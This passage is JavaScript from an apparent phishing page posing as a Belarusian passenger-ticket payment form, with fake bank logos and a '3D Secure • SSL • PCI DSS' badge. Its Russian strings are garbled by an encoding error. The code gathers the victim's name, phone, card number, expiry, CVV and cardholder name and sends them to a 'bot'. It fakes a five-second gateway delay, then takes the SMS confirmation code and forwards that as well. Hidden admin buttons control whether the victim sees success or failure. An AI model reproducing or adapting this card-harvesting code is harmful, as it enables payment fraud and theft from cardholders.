                html += `<div class="bank-strip">
                    <span>–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫</span> <span>–ü—Ä–∏–æ—Ä–±–∞–Ω–∫</span> <span>–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫</span>
                    <span>Visa</span> <span>Mastercard</span> <span>–ë–µ–ª–∫–∞—Ä—Ç</span> <span>–ú–ò–†</span>
                </div>`;
                html += `<div class="footer-note">üîí 3D Secure ‚Ä¢ SSL ‚Ä¢ PCI DSS</div>`;

                app.innerHTML = html;

                // ========== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò ==========
                if (state.step === 'passenger') {
                    document.getElementById('nextToCard')?.addEventListener('click', () => {
                        const full = document.getElementById('fullName')?.value.trim() || '';
                        const phone = document.getElementById('phone')?.value.trim() || '';
                        const email = document.getElementById('email')?.value.trim() || '';
                        if (!full || !phone) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω'); return; }
                        state.passenger = { fullName: full, phone, email };
                        goToCard();
                    });
                }

                else if (state.step === 'card') {
                    const cardNum = document.getElementById('cardNumber');
                    const exp = document.getElementById('expiry');
                    const cvv = document.getElementById('cvv');
                    if (cardNum) cardNum.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    if (exp) exp.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    if (cvv) cvv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', () => {
                        state.card.number = document.getElementById('cardNumber')?.value.trim() || '';
                        state.card.expiry = document.getElementById('expiry')?.value.trim() || '';
                        state.card.cvv = document.getElementById('cvv')?.value.trim() || '';
                        state.card.cardholder = document.getElementById('cardholder')?.value.trim() || '';
                        if (!state.card.number || !state.card.expiry || !state.card.cvv || !state.card.cardholder) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã'); return;
                        }
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞—Ä—Ç—É –≤ –±–æ—Ç–∞
                        sendToBot('card');
                        goToProcessing1();
                        // –ß–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ SMS (–∏–º–∏—Ç–∞—Ü–∏—è —Ä–∞–±–æ—Ç—ã —à–ª—é–∑–∞)
                        setTimeout(() => {
                            if (state.step === 'processing1') goToSms();
                        }, 5000);
                    });

                    document.getElementById('backToPassenger')?.addEventListener('click', goToPassenger);
                }

                else if (state.step === 'sms') {
                    document.getElementById('confirmSms')?.addEventListener('click', () => {
                        const code = document.getElementById('smsCode')?.value.trim() || '';
                        if (!code || code.length < 4) { alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS'); return; }
                        state.smsCode = code;
                        sendToBot('sms');
                        goToProcessing2();
                        // –î–ª—è –¥–µ–º–æ —á–µ—Ä–µ–∑ 5 —Å–µ–∫ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —É—Å–ø–µ—Ö, –Ω–æ –æ—Å—Ç–∞–≤–∏–º —Ä—É—á–Ω—ã–µ –∫–Ω–æ–ø–∫–∏
                        // (—Å–º. –Ω–∏–∂–µ —Ç–µ—Å—Ç–æ–≤—ã–µ –∫–Ω–æ–ø–∫–∏)
                    });

                    document.getElementById('resendSms')?.addEventListener('click', () => {
                        sendToBot('resend');
                        document.getElementById('smsCode').value = '';
                        alert('–ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                    });

                    document.getElementById('backToCard')?.addEventListener('click', goToCard);
                }

                else if (state.step === 'processing2') {
                    // –¢–µ—Å—Ç–æ–≤—ã–µ –∫–Ω–æ–ø–∫–∏ –¥–ª—è –∞–¥–º–∏–Ω–∞ (–≤ —Ä–∞–±–æ—á–µ–º –≤–∞—Ä–∏–∞–Ω—Ç–µ –æ–Ω–∏ —Å–∫—Ä—ã—Ç—ã)
                    document.getElementById('testSuccess')?.addEventListener('click', goToSuccess);
                    document.getElementById('testFail')?.addEventListener('click', goToFail);
                }

                else if (state.step === 'fail') {
                    document.getElementById('tryAgain')?.addEventListener('click', () => {
                        // –°–±—Ä–æ—Å –¥–æ –∫–∞—Ä—Ç—ã, –Ω–æ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è–µ–º
                        state.step = 'card';
                        render();
                    });
                }
            }

            // –°—Ç–∞—Ä—Ç
            render();
        })();
    </script>
